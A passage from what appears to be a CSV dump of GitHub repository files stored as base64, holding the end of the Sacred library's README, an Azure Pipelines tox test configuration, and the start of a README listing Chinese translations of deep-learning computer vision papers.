IG9yZGVyIHRvIGxvZyB5b3VyIHJ1bnMgdG8gTmVwdHVuZSwgYWxsIHlvdSBu
ZWVkIHRvIGRvIGlzIGFkZCBhbiBvYnNlcnZlcjoKCi4uIGNvZGUtYmxvY2s6
OiBweXRob24KCiAgICBmcm9tIG5lcHR1bmVjb250cmliLm1vbml0b3Jpbmcu
c2FjcmVkIGltcG9ydCBOZXB0dW5lT2JzZXJ2ZXIKICAgIGV4Lm9ic2VydmVy
cy5hcHBlbmQoTmVwdHVuZU9ic2VydmVyKGFwaV90b2tlbj0nWU9VUl9BUElf
VE9LRU4nLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgcHJvamVjdF9uYW1lPSdVU0VSX05BTUUvUFJPSkVDVF9OQU1FJykpCgpG
b3IgbW9yZSBpbmZvLCBjaGVjayB0aGUgYG5lcHR1bmUtY29udHJpYiBsaWJy
YXJ5IDxodHRwczovL25lcHR1bmUtY29udHJpYi5yZWFkdGhlZG9jcy5pby9l
eGFtcGxlcy9vYnNlcnZlcl9zYWNyZWQuaHRtbD5gXy4KCmBTYWNyZWRCcm93
c2VyIDxodHRwczovL2dpdGh1Yi5jb20vbWljaGFlbHdhbmQvU2FjcmVkQnJv
d3Nlcj5gXworKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysKLi4gaW1hZ2U6OiBkb2NzL2lt
YWdlcy9zYWNyZWRfYnJvd3Nlci5wbmcKClNhY3JlZEJyb3dzZXIgaXMgYSBQ
eVF0NCBhcHBsaWNhdGlvbiB0byBicm93c2UgdGhlIE1vbmdvREIgZW50cmll
cyBjcmVhdGVkIGJ5CnNhY3JlZCBleHBlcmltZW50cy4KRmVhdHVyZXMgaW5j
bHVkZSBjdXN0b20gcXVlcmllcywgc29ydGluZyBvZiB0aGUgcmVzdWx0cywK
YWNjZXNzIHRvIHRoZSBzdG9yZWQgc291cmNlLWNvZGUsIGFuZCBtYW55IG1v
cmUuCk5vIGluc3RhbGxhdGlvbiBpcyByZXF1aXJlZCBhbmQgaXQgY2FuIGNv
bm5lY3QgdG8gYSBsb2NhbApkYXRhYmFzZSBvciBvdmVyIHRoZSBuZXR3b3Jr
LgoKCmBQcm9waGV0IDxodHRwczovL2dpdGh1Yi5jb20vUXdsb3VzZS9wcm9w
aGV0PmBfCisrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKysrKysrClByb3BoZXQgaXMgYW4gZWFybHkgcHJvdG90eXBlIG9mIGEg
d2ViaW50ZXJmYWNlIHRvIHRoZSBNb25nb0RCIGVudHJpZXMgY3JlYXRlZCBi
eQpzYWNyZWQgZXhwZXJpbWVudHMsIHRoYXQgaXMgZGlzY29udGludWVkLgpJ
dCByZXF1aXJlcyB5b3UgdG8gcnVuIGBSZXN0SGVhcnQgPGh0dHA6Ly9yZXN0
aGVhcnQub3JnPmBfIHRvIGFjY2VzcyB0aGUgZGF0YWJhc2UuCgoKUmVsYXRl
ZCBQcm9qZWN0cwotLS0tLS0tLS0tLS0tLS0tCgpgU3VtYXRyYSA8aHR0cHM6
Ly9weXRob25ob3N0ZWQub3JnL1N1bWF0cmEvPmBfCisrKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysKICAgfCBTdW1hdHJh
IGlzIGEgdG9vbCBmb3IgbWFuYWdpbmcgYW5kIHRyYWNraW5nIHByb2plY3Rz
IGJhc2VkIG9uIG51bWVyaWNhbAogICB8IHNpbXVsYXRpb24gYW5kL29yIGFu
YWx5c2lzLCB3aXRoIHRoZSBhaW0gb2Ygc3VwcG9ydGluZyByZXByb2R1Y2li
bGUgcmVzZWFyY2guCiAgIHwgSXQgY2FuIGJlIHRob3VnaHQgb2YgYXMgYW4g
YXV0b21hdGVkIGVsZWN0cm9uaWMgbGFiIG5vdGVib29rIGZvcgogICB8IGNv
bXB1dGF0aW9uYWwgcHJvamVjdHMuCgpTdW1hdHJhIHRha2VzIGEgZGlmZmVy
ZW50IGFwcHJvYWNoIGJ5IHByb3ZpZGluZyBjb21tYW5kbGluZSB0b29scyB0
byBpbml0aWFsaXplCmEgcHJvamVjdCBhbmQgdGhlbiBydW4gYXJiaXRyYXJ5
IGNvZGUgKG5vdCBqdXN0IHB5dGhvbikuCkl0IHRyYWNrcyBpbmZvcm1hdGlv
biBhYm91dCBhbGwgcnVucyBpbiBhIFNRTCBkYXRhYmFzZSBhbmQgZXZlbiBw
cm92aWRlcyBhIG5pY2UgYnJvd3NlciB0b29sLgpJdCBpbnRlZ3JhdGVzIGxl
c3MgdGlnaHRseSB3aXRoIHRoZSBjb2RlIHRvIGJlIHJ1biwgd2hpY2ggbWFr
ZXMgaXQgZWFzaWx5CmFwcGxpY2FibGUgdG8gbm9uLXB5dGhvbiBleHBlcmlt
ZW50cy4KQnV0IHRoYXQgYWxzbyBtZWFucyBpdCByZXF1aXJlcyBtb3JlIHNl
dHVwIGZvciBlYWNoIGV4cGVyaW1lbnQgYW5kCmNvbmZpZ3VyYXRpb24gbmVl
ZHMgdG8gYmUgZG9uZSB1c2luZyBmaWxlcy4KVXNlIHRoaXMgcHJvamVjdCBp
ZiB5b3UgbmVlZCB0byBydW4gbm9uLXB5dGhvbiBleHBlcmltZW50cywgb3Ig
YXJlIG9rIHdpdGggdGhlIGFkZGl0aW9uYWwgc2V0dXAvY29uZmlndXJhdGlv
biBvdmVyaGVhZC4KCgpgRnV0dXJlIEdhZGdldCBMYWJvcmF0b3J5IDxodHRw
czovL2dpdGh1Yi5jb20vS2FpeGhpbi9GR0xhYj5gXworKysrKysrKysrKysr
KysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysr
KysrKwogICB8IEZHTGFiIGlzIGEgbWFjaGluZSBsZWFybmluZyBkYXNoYm9h
cmQsIGRlc2lnbmVkIHRvIG1ha2UgcHJvdG90eXBpbmcKICAgfCBleHBlcmlt
ZW50cyBlYXNpZXIuIEV4cGVyaW1lbnQgZGV0YWlscyBhbmQgcmVzdWx0cyBh
cmUgc2VudCB0byBhIGRhdGFiYXNlLAogICB8IHdoaWNoIGFsbG93cyBhbmFs
eXRpY3MgdG8gYmUgcGVyZm9ybWVkIGFmdGVyIHRoZWlyIGNvbXBsZXRpb24u
IFRoZSBzZXJ2ZXIKICAgfCBpcyBGR0xhYiwgYW5kIHRoZSBjbGllbnRzIGFy
ZSBGR01hY2hpbmVzLgoKU2ltaWxhciB0byBTdW1hdHJhLCBGR0xhYiBpcyBh
biBleHRlcm5hbCB0b29sIHRoYXQgY2FuIGtlZXAgdHJhY2sgb2YgcnVucyBm
cm9tCmFueSBwcm9ncmFtLiBQcm9qZWN0cyBhcmUgY29uZmlndXJlZCB2aWEg
YSBKU09OIHNjaGVtYSBhbmQgdGhlIHByb2dyYW0gbmVlZHMgdG8KYWNjZXB0
IHRoZXNlIGNvbmZpZ3VyYXRpb25zIHZpYSBjb21tYW5kLWxpbmUgb3B0aW9u
cy4KRkdMYWIgYWxzbyB0YWtlcyB0aGUgcm9sZSBvZiBhIGJhc2ljIHNjaGVk
dWxlciBieSBkaXN0cmlidXRpbmcgcnVucyBvdmVyIHNldmVyYWwKbWFjaGlu
ZXMuCgoKYENERSA8aHR0cHM6Ly9naXRodWIuY29tL3BnYm92aW5lL0NERS8+
YF8KKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysrKysK
QnkgdHJhY2luZyBzeXN0ZW0gY2FsbHMgZHVyaW5nIHByb2dyYW0gZXhlY3V0
aW9uIENERSBjcmVhdGVzIGEgc25hcHNob3Qgb2YKKiphbGwqKiB1c2VkIGZp
bGVzIGFuZCBsaWJyYXJpZXMgdG8gZ3VhcmFudGVlIHRoZSBhYmlsaXR5IHRv
IHJlcHJvZHVjZSBhbnkgdW5peApwcm9ncmFtIGV4ZWN1dGlvbi4gSXQgKm9u
bHkqIHNvbHZlcyByZXByb2R1Y2liaWxpdHksIGJ1dCBpdCBkb2VzIHNvIHRo
b3JvdWdobHkuCgoKTGljZW5zZQotLS0tLS0tClRoaXMgcHJvamVjdCBpcyBy
ZWxlYXNlZCB1bmRlciB0aGUgdGVybXMgb2YgdGhlIGBNSVQgbGljZW5zZSA8
aHR0cDovL29wZW5zb3VyY2Uub3JnL2xpY2Vuc2VzL01JVD5gXy4KCgpDaXRp
bmcgU2FjcmVkCi0tLS0tLS0tLS0tLS0KYEsuIEdyZWZmLCBBLiBLbGVpbiwg
TS4gQ2hvdmFuZWMsIEYuIEh1dHRlciwgYW5kIEouIFNjaG1pZGh1YmVyLCDi
gJhUaGUgU2FjcmVkIEluZnJhc3RydWN0dXJlIGZvciBDb21wdXRhdGlvbmFs
IFJlc2VhcmNo4oCZLCAKaW4gUHJvY2VlZGluZ3Mgb2YgdGhlIDE1dGggUHl0
aG9uIGluIFNjaWVuY2UgQ29uZmVyZW5jZSAoU2NpUHkgMjAxNyksIEF1c3Rp
biwgVGV4YXMsIDIwMTcsIHBwLiA0OeKAkzU2IAo8aHR0cDovL2NvbmZlcmVu
Y2Uuc2NpcHkub3JnL3Byb2NlZWRpbmdzL3NjaXB5MjAxNy9rbGF1c19ncmVm
Zi5odG1sPmBfLgoKCi4uIHxweXBpfCBpbWFnZTo6IGh0dHBzOi8vaW1nLnNo
aWVsZHMuaW8vcHlwaS92L3NhY3JlZC5zdmcKICAgIDp0YXJnZXQ6IGh0dHBz
Oi8vcHlwaS5weXRob24ub3JnL3B5cGkvc2FjcmVkCiAgICA6YWx0OiBDdXJy
ZW50IFB5UGkgVmVyc2lvbgoKLi4gfHB5X3ZlcnNpb25zfCBpbWFnZTo6IGh0
dHBzOi8vaW1nLnNoaWVsZHMuaW8vcHlwaS9weXZlcnNpb25zL3NhY3JlZC5z
dmcKICAgIDp0YXJnZXQ6IGh0dHBzOi8vcHlwaS5weXRob24ub3JnL3B5cGkv
c2FjcmVkCiAgICA6YWx0OiBTdXBwb3J0ZWQgUHl0aG9uIFZlcnNpb25zCgou
LiB8bGljZW5zZXwgaW1hZ2U6OiBodHRwczovL2ltZy5zaGllbGRzLmlvL2Jh
ZGdlL2xpY2Vuc2UtTUlULWJsdWUucG5nCiAgICA6dGFyZ2V0OiBodHRwOi8v
Y2hvb3NlYWxpY2Vuc2UuY29tL2xpY2Vuc2VzL21pdC8KICAgIDphbHQ6IE1J
VCBsaWNlbnNlZAoKLi4gfHJ0ZmR8IGltYWdlOjogaHR0cHM6Ly9yZWFkdGhl
ZG9jcy5vcmcvcHJvamVjdHMvc2FjcmVkL2JhZGdlLz92ZXJzaW9uPWxhdGVz
dCZzdHlsZT1mbGF0CiAgICA6dGFyZ2V0OiBodHRwczovL3NhY3JlZC5yZWFk
dGhlZG9jcy5pby9lbi9zdGFibGUvCiAgICA6YWx0OiBSZWFkVGhlRG9jcwoK
Li4gfGRvaXwgaW1hZ2U6OiBodHRwczovL3plbm9kby5vcmcvYmFkZ2UvZG9p
LzEwLjUyODEvemVub2RvLjE2Mzg2LnN2ZwogICAgOnRhcmdldDogaHR0cDov
L2R4LmRvaS5vcmcvMTAuNTI4MS96ZW5vZG8uMTYzODYKICAgIDphbHQ6IERP
SSBmb3IgdGhpcyByZWxlYXNlCgouLiB8YnVpbGR8IGltYWdlOjogaHR0cHM6
Ly9kZXYuYXp1cmUuY29tL3F3bG91c2UvU2FjcmVkJTIwQ0kvX2FwaXMvYnVp
bGQvc3RhdHVzL0lEU0lBLnNhY3JlZD9icmFuY2hOYW1lPW1hc3RlcgogICAg
OnRhcmdldDogaHR0cHM6Ly9kZXYuYXp1cmUuY29tL3F3bG91c2UvU2FjcmVk
JTIwQ0kvX2J1aWxkL2xhdGVzdD9kZWZpbml0aW9uSWQ9MSZicmFuY2hOYW1l
PW1hc3RlcgogICAgOmFsdDogQXp1cmUgQ0kgc3RhdHVzCgouLiB8Y292ZXJh
Z2V8IGltYWdlOjogaHR0cHM6Ly9jb3ZlcmFsbHMuaW8vcmVwb3MvSURTSUEv
c2FjcmVkL2JhZGdlLnN2ZwogICAgOnRhcmdldDogaHR0cHM6Ly9jb3ZlcmFs
bHMuaW8vci9JRFNJQS9zYWNyZWQKICAgIDphbHQ6IENvdmVyYWdlIFJlcG9y
dAoKLi4gfGNvZGVfcXVhbGl0eXwgaW1hZ2U6OiBodHRwczovL3NjcnV0aW5p
emVyLWNpLmNvbS9nL0lEU0lBL3NhY3JlZC9iYWRnZXMvcXVhbGl0eS1zY29y
ZS5wbmc/Yj1tYXN0ZXIKICAgIDp0YXJnZXQ6IGh0dHBzOi8vc2NydXRpbml6
ZXItY2kuY29tL2cvSURTSUEvc2FjcmVkLwogICAgOmFsdDogQ29kZSBTY3J1
dGluaXplciBRdWFsaXR5CgouLiB8YmxhY2t8IGltYWdlOjogaHR0cHM6Ly9p
bWcuc2hpZWxkcy5pby9iYWRnZS9jb2RlJTIwc3R5bGUtYmxhY2stMDAwMDAw
LnN2ZwogICAgOnRhcmdldDogaHR0cHM6Ly9naXRodWIuY29tL2FtYnYvYmxh
Y2sKICAgIDphbHQ6IENvZGUgc3R5bGU6IGJsYWNrCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"CmpvYnM6Ci0gam9iOiB0ZXN0CiAgc3RyYXRlZ3k6CiAgICBtYXRyaXg6CiAg
ICAgIFdpbmRvd3MgcHkzNToKICAgICAgICBJTUFHRV9OQU1FOiAndnMyMDE3
LXdpbjIwMTYnCiAgICAgICAgUFlUSE9OX1ZFUlNJT046ICczLjUnCiAgICAg
ICAgVE9YX0NNRDogJ3B5MzUnCiAgICAgIFdpbmRvd3MgcHkzNjoKICAgICAg
ICBJTUFHRV9OQU1FOiAndnMyMDE3LXdpbjIwMTYnCiAgICAgICAgUFlUSE9O
X1ZFUlNJT046ICczLjYnCiAgICAgICAgVE9YX0NNRDogJ3B5MzYnCiAgICAg
IFdpbmRvd3MgcHkzNzoKICAgICAgICBJTUFHRV9OQU1FOiAndnMyMDE3LXdp
bjIwMTYnCiAgICAgICAgUFlUSE9OX1ZFUlNJT046ICczLjcnCiAgICAgICAg
VE9YX0NNRDogJ3B5MzcnCiAgICAgIE9TWCBweTM1OgogICAgICAgIElNQUdF
X05BTUU6ICdtYWNvcy0xMC4xMycKICAgICAgICBQWVRIT05fVkVSU0lPTjog
JzMuNScKICAgICAgICBUT1hfQ01EOiAncHkzNScKICAgICAgT1NYIHB5MzY6
CiAgICAgICAgSU1BR0VfTkFNRTogJ21hY29zLTEwLjEzJwogICAgICAgIFBZ
VEhPTl9WRVJTSU9OOiAnMy42JwogICAgICAgIFRPWF9DTUQ6ICdweTM2Jwog
ICAgICBPU1ggcHkzNzoKICAgICAgICBJTUFHRV9OQU1FOiAnbWFjb3MtMTAu
MTMnCiAgICAgICAgUFlUSE9OX1ZFUlNJT046ICczLjcnCiAgICAgICAgVE9Y
X0NNRDogJ3B5MzcnCiAgICAgIExpbnV4IHB5MzU6CiAgICAgICAgSU1BR0Vf
TkFNRTogJ3VidW50dS0xNi4wNCcKICAgICAgICBQWVRIT05fVkVSU0lPTjog
JzMuNScKICAgICAgICBUT1hfQ01EOiAncHkzNScKICAgICAgTGludXggcHkz
NjoKICAgICAgICBJTUFHRV9OQU1FOiAndWJ1bnR1LTE2LjA0JwogICAgICAg
IFBZVEhPTl9WRVJTSU9OOiAnMy42JwogICAgICAgIFRPWF9DTUQ6ICdweTM2
JwogICAgICBMaW51eCBweTM3OgogICAgICAgIElNQUdFX05BTUU6ICd1YnVu
dHUtMTYuMDQnCiAgICAgICAgUFlUSE9OX1ZFUlNJT046ICczLjcnCiAgICAg
ICAgVE9YX0NNRDogJ3B5MzcnCiAgICAgIExpbnV4IHRlbnNvcmZsb3dfMTEy
OgogICAgICAgIElNQUdFX05BTUU6ICd1YnVudHUtMTYuMDQnCiAgICAgICAg
UFlUSE9OX1ZFUlNJT046ICczLjYnCiAgICAgICAgVE9YX0NNRDogJ3RlbnNv
cmZsb3ctMTEyJwogICAgICBMaW51eCB0ZW5zb3JmbG93XzExMzoKICAgICAg
ICBJTUFHRV9OQU1FOiAndWJ1bnR1LTE2LjA0JwogICAgICAgIFBZVEhPTl9W
RVJTSU9OOiAnMy42JwogICAgICAgIFRPWF9DTUQ6ICd0ZW5zb3JmbG93LTEx
MycKICAgICAgTGludXggdGVuc29yZmxvdy0xMTQ6CiAgICAgICAgSU1BR0Vf
TkFNRTogJ3VidW50dS0xNi4wNCcKICAgICAgICBQWVRIT05fVkVSU0lPTjog
JzMuNycKICAgICAgICBUT1hfQ01EOiAndGVuc29yZmxvdy0xMTQnCiAgICAg
IExpbnV4IHRlbnNvcmZsb3dfMjoKICAgICAgICBJTUFHRV9OQU1FOiAndWJ1
bnR1LTE2LjA0JwogICAgICAgIFBZVEhPTl9WRVJTSU9OOiAnMy43JwogICAg
ICAgIFRPWF9DTUQ6ICd0ZW5zb3JmbG93LTInCiAgICAgIExpbnV4IHNldHVw
OgogICAgICAgIElNQUdFX05BTUU6ICd1YnVudHUtMTYuMDQnCiAgICAgICAg
UFlUSE9OX1ZFUlNJT046ICczLjcnCiAgICAgICAgVE9YX0NNRDogJ3NldHVw
JwogICAgICBMaW51eCBmbGFrZTg6CiAgICAgICAgSU1BR0VfTkFNRTogJ3Vi
dW50dS0xNi4wNCcKICAgICAgICBQWVRIT05fVkVSU0lPTjogJzMuNycKICAg
ICAgICBUT1hfQ01EOiAnZmxha2U4JwogICAgICBMaW51eCBibGFjazoKICAg
ICAgICBJTUFHRV9OQU1FOiAndWJ1bnR1LTE2LjA0JwogICAgICAgIFBZVEhP
Tl9WRVJTSU9OOiAnMy42JwogICAgICAgIFRPWF9DTUQ6ICdibGFjaycKICAg
ICAgTGludXggY292ZXJhZ2U6CiAgICAgICAgSU1BR0VfTkFNRTogJ3VidW50
dS0xNi4wNCcKICAgICAgICBQWVRIT05fVkVSU0lPTjogJzMuNycKICAgICAg
ICBUT1hfQ01EOiAnY292ZXJhZ2UnCiAgcG9vbDoKICAgIHZtSW1hZ2U6ICQo
SU1BR0VfTkFNRSkKICBzdGVwczoKICAgIC0gdGFzazogVXNlUHl0aG9uVmVy
c2lvbkAwCiAgICAgIGlucHV0czoKICAgICAgICB2ZXJzaW9uU3BlYzogJChQ
WVRIT05fVkVSU0lPTikKICAgIC0gYmFzaDogcGlwIGluc3RhbGwgdG94CiAg
ICAtIGJhc2g6IHRveCAtZSAkVE9YX0NNRAotIGpvYjogdGVzdF9wcmVfY29t
bWl0CiAgcG9vbDoKICAgIHZtSW1hZ2U6ICd1YnVudHUtMTYuMDQnCiAgc3Rl
cHM6CiAgICAtIHRhc2s6IFVzZVB5dGhvblZlcnNpb25AMAogICAgICBpbnB1
dHM6CiAgICAgICAgdmVyc2lvblNwZWM6ICczLjYnCiAgICAtIGJhc2g6IGJh
c2ggLi90ZXN0cy9jaGVja19wcmVfY29tbWl0LnNoCg==
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'deep-learning-papers-translation',115993068,b'\xe6\xb7\xb1\xe5\xba\xa6\xe5\xad\xa6\xe4\xb9\xa0\xe8\xae\xba\xe6\x96\x87\xe7\xbf\xbb\xe8\xaf\x91\xef\xbc\x8c\xe5\x8c\x85\xe6\x8b\xac\xe5\x88\x86\xe7\xb1\xbb\xe8\xae\xba\xe6\x96\x87\xef\xbc\x8c\xe6\xa3\x80\xe6\xb5\x8b\xe8\xae\xba\xe6\x96\x87\xe7\xad\x89',,1,2398,,2398,False,b'https://api.github.com/repos/SnailTyan/deep-learning-papers-translation/forks',"IyBEZWVwIExlYXJuaW5nIFBhcGVycyBUcmFuc2xhdGlvbihDVikKCgojIyBJ
bWFnZSBDbGFzc2lmaWNhdGlvbgoKKiBBbGV4TmV0ICAKW0ltYWdlTmV0IENs
YXNzaWZpY2F0aW9uIHdpdGggRGVlcCBDb252b2x1dGlvbmFsIE5ldXJhbCBO
ZXR3b3Jrc10oaHR0cHM6Ly9wYXBlcnMubmlwcy5jYy9wYXBlci80ODI0LWlt
YWdlbmV0LWNsYXNzaWZpY2F0aW9uLXdpdGgtZGVlcC1jb252b2x1dGlvbmFs
LW5ldXJhbC1uZXR3b3Jrcy5wZGYpClvkuK3mlofniYhdKGh0dHA6Ly9ub2Fo
c25haWwuY29tLzIwMTcvMDcvMTgvMjAxNy0wNy0xOC1BbGV4TmV0JUU4JUFF
JUJBJUU2JTk2JTg3JUU3JUJGJUJCJUU4JUFGJTkxJUUyJTgwJTk0JUUyJTgw
JTk0JUU0JUI4JUFEJUU2JTk2JTg3JUU3JTg5JTg4LykKW+S4reiLseaWh+Wv
ueeFp10oaHR0cDovL25vYWhzbmFpbC5jb20vMjAxNy8wNy8wNC8yMDE3LTA3
LTA0LUFsZXhOZXQlRTglQUUlQkElRTYlOTYlODclRTclQkYlQkIlRTglQUYl
OTEvKQoKKiBWR0cgIApbVmVyeSBEZWVwIENvbnZvbHV0aW9uYWwgTmV0d29y
a3MgZm9yIExhcmdlLVNjYWxlIEltYWdlIFJlY29nbml0aW9uXShodHRwczov
L2FyeGl2Lm9yZy9hYnMvMTQwOS4xNTU2KQpb5Lit5paH54mIXShodHRwOi8v
bm9haHNuYWlsLmNvbS8yMDE3LzA4LzE3LzIwMTctMDgtMTctVkdHJUU4JUFF
JUJBJUU2JTk2JTg3JUU3JUJGJUJCJUU4JUFGJTkxJUUyJTgwJTk0JUUyJTgw
JTk0JUU0JUI4JUFEJUU2JTk2JTg3JUU3JTg5JTg4LykKW+S4reiLseaWh+Wv
ueeFp10oaHR0cDovL25vYWhzbmFpbC5jb20vMjAxNy8wOC8xNy8yMDE3LTA4
LTE3LVZHRyVFOCVBRSVCQSVFNiU5NiU4NyVFNyVCRiVCQiVFOCVBRiU5MSVF
MiU4MCU5NCVFMiU4MCU5NCVFNCVCOCVBRCVFOCU4QiVCMSVFNiU5NiU4NyVF
NSVBRiVCOSVFNyU4NSVBNy8pCgoqIFJlc05ldCAgCltEZWVwIFJlc2lkdWFs
IExlYXJuaW5nIGZvciBJbWFnZSBSZWNvZ25pdGlvbl0oaHR0cHM6Ly9hcnhp
di5vcmcvYWJzLzE1MTIuMDMzODUpClvkuK3mlofniYhdKGh0dHA6Ly9ub2Fo
c25haWwuY29tLzIwMTcvMDcvMzEvMjAxNy0wNy0zMS1SZXNOZXQlRTglQUUl
QkElRTYlOTYlODclRTclQkYlQkIlRTglQUYlOTElRTIlODAlOTQlRTIlODAl
OTQlRTQlQjglQUQlRTYlOTYlODclRTclODklODgvKQpb5Lit6Iux5paH5a+5
54WnXShodHRwOi8vbm9haHNuYWlsLmNvbS8yMDE3LzA3LzMxLzIwMTctMDct
MzEtUmVzTmV0JUU4JUFFJUJBJUU2JTk2JTg3JUU3JUJGJUJCJUU4JUFGJTkx
JUUyJTgwJTk0JUUyJTgwJTk0JUU0JUI4JUFEJUU4JThCJUIxJUU2JTk2JTg3
JUU1JUFGJUI5JUU3JTg1JUE3LykKCiogR29vZ0xlTmV0ICAKW0dvaW5nIERl
ZXBlciBXaXRoIENvbnZvbHV0aW9uc10oaHR0cHM6Ly9hcnhpdi5vcmcvYWJz
LzE0MDkuNDg0MikKW+S4reaWh+eJiF0oaHR0cDovL25vYWhzbmFpbC5jb20v
MjAxNy8wNy8yMS8yMDE3LTA3LTIxLUdvb2dsZU5ldCVFOCVBRSVCQSVFNiU5
NiU4NyVFNyVCRiVCQiVFOCVBRiU5MSVFMiU4MCU5NCVFMiU4MCU5NCVFNCVC
OCVBRCVFNiU5NiU4NyVFNyU4OSU4OC8pClvkuK3oi7Hmloflr7nnhaddKGh0
dHA6Ly9ub2Foc25haWwuY29tLzIwMTcvMDcvMjEvMjAxNy0wNy0yMS1Hb29n
bGVOZXQlRTglQUUlQkElRTYlOTYlODclRTclQkYlQkIlRTglQUYlOTElRTIl
ODAlOTQlRTIlODAlOTQlRTQlQjglQUQlRTglOEIlQjElRTYlOTYlODclRTUl
QUYlQjklRTclODUlQTcvKQoKKiBCTi1Hb29nTGVOZXQgIApbQmF0Y2ggTm9y
bWFsaXphdGlvbjogQWNjZWxlcmF0aW5nIERlZXAgTmV0d29yayBUcmFpbmlu
ZyBieSBSZWR1Y2luZyBJbnRlcm5hbCBDb3ZhcmlhdGUgU2hpZnRdKGh0dHBz
Oi8vYXJ4aXYub3JnL2Ficy8xNTAyLjAzMTY3KQpb5Lit5paH54mIXShodHRw
Oi8vbm9haHNuYWlsLmNvbS8yMDE3LzA5LzA0LzIwMTctMDktMDQtQmF0Y2gl
MjBOb3JtYWxpemF0aW9uJUU4JUFFJUJBJUU2JTk2JTg3JUU3JUJGJUJCJUU4
JUFGJTkxJUUyJTgwJTk0JUUyJTgwJTk0JUU0JUI4JUFEJUU2JTk2JTg3JUU3
JTg5JTg4LykKW+S4reiLseaWh+WvueeFp10oaHR0cDovL25vYWhzbmFpbC5j
b20vMjAxNy8wOS8wNC8yMDE3LTA5LTA0LUJhdGNoJTIwTm9ybWFsaXphdGlv
biVFOCVBRSVCQSVFNiU5NiU4NyVFNyVCRiVCQiVFOCVBRiU5MSVFMiU4MCU5
NCVFMiU4MCU5NCVFNCVCOCVBRCVFOCU4QiVCMSVFNiU5NiU4NyVFNSVBRiVC
OSVFNyU4NSVBNy8pCgoqIEluY2VwdGlvbi12MyAgCltSZXRoaW5raW5nIHRo
ZSBJbmNlcHRpb24gQXJjaGl0ZWN0dXJlIGZvciBDb21wdXRlciBWaXNpb25d
KGh0dHBzOi8vYXJ4aXYub3JnL2Ficy8xNTEyLjAwNTY3KQpb5Lit5paH54mI
XShodHRwOi8vbm9haHNuYWlsLmNvbS8yMDE3LzEwLzA5LzIwMTctMTAtMDkt
SW5jZXB0aW9uLVYzJUU4JUFFJUJBJUU2JTk2JTg3JUU3JUJGJUJCJUU4JUFG
JTkxJUUyJTgwJTk0JUUyJTgwJTk0JUU0JUI4JUFEJUU2JTk2JTg3JUU3JTg5
JTg4LykKW+S4reiLseaWh+WvueeFp10oaHR0cDovL25vYWhzbmFpbC5jb20v
MjAxNy8xMC8wOS8yMDE3LTEwLTA5LUluY2VwdGlvbi1WMyVFOCVBRSVCQSVF
NiU5NiU4NyVFNyVCRiVCQiVFOCVBRiU5MSVFMiU4MCU5NCVFMiU4MCU5NCVF
NCVCOCVBRCVFOCU4QiVCMSVFNiU5NiU4NyVFNSVBRiVCOSVFNyU4NSVBNy8p
CgoqIFNFTmV0ICAKW1NxdWVlemUtYW5kLUV4Y2l0YXRpb24gTmV0d29ya3Nd
KGh0dHBzOi8vYXJ4aXYub3JnL2Ficy8xNzA5LjAxNTA3KQpb5Lit5paH54mI
XShodHRwOi8vbm9haHNuYWlsLmNvbS8yMDE3LzExLzIwLzIwMTctMTEtMjAt
U3F1ZWV6ZS1hbmQtRXhjaXRhdGlvbiUyME5ldHdvcmtzJUU4JUFFJUJBJUU2
JTk2JTg3JUU3JUJGJUJCJUU4JUFGJTkxJUUyJTgwJTk0JUUyJTgwJTk0JUU0
JUI4JUFEJUU2JTk2JTg3JUU3JTg5JTg4LykKW+S4reiLseaWh+WvueeFp10o
aHR0cDovL25vYWhzbmFpbC5jb20vMjAxNy8xMS8yMC8yMDE3LTExLTIwLVNx
dWVlemUtYW5kLUV4Y2l0YXRpb24lMjBOZXR3b3JrcyVFOCVBRSVCQSVFNiU5
NiU4NyVFNyVCRiVCQiVFOCVBRiU5MSVFMiU4MCU5NCVFMiU4MCU5NCVFNCVC
OCVBRCVFOCU4QiVCMSVFNiU5NiU4NyVFNSVBRiVCOSVFNyU4NSVBNy8pCgoj
IyBPYmplY3QgRGV0ZWN0aW9uCgoqIFlPTE8gICAKW1lvdSBPbmx5IExvb2sg
T25jZTogVW5pZmllZCwgUmVhbC1UaW1lIE9iamVjdCBEZXRlY3Rpb25dKGh0
dHBzOi8vYXJ4aXYub3JnL2Ficy8xNTA2LjAyNjQwKQpb5Lit5paH54mIXSho
dHRwOi8vbm9haHNuYWlsLmNvbS8yMDE3LzA4LzAyLzIwMTctMDgtMDItWU9M
TyVFOCVBRSVCQSVFNiU5NiU4NyVFNyVCRiVCQiVFOCVBRiU5MSVFMiU4MCU5
NCVFMiU4MCU5NCVFNCVCOCVBRCVFNiU5NiU4NyVFNyU4OSU4OC8pClvkuK3o
i7Hmloflr7nnhaddKGh0dHA6Ly9ub2Foc25haWwuY29tLzIwMTcvMDgvMDIv
MjAxNy0wOC0wMi1ZT0xPJUU4JUFFJUJBJUU2JTk2JTg3JUU3JUJGJUJCJUU4
JUFGJTkxJUUyJTgwJTk0JUUyJTgwJTk0JUU0JUI4JUFEJUU4JThCJUIxJUU2
JTk2JTg3JUU1JUFGJUI5JUU3JTg1JUE3LykKCiogU1NEICAKW1NTRDogU2lu
Z2xlIFNob3QgTXVsdGlCb3ggRGV0ZWN0b3JdKGh0dHBzOi8vYXJ4aXYub3Jn
L2Ficy8xNTEyLjAyMzI1KQpb5Lit5paH54mIXShodHRwOi8vbm9haHNuYWls
LmNvbS8yMDE3LzEyLzExLzIwMTctMTItMTEtU2luZ2xlJTIwU2hvdCUyME11
bHRpQm94JTIwRGV0ZWN0b3IlRTglQUUlQkElRTYlOTYlODclRTclQkYlQkIl
RTglQUYlOTElRTIlODAlOTQlRTIlODAlOTQlRTQlQjglQUQlRTYlOTYlODcl
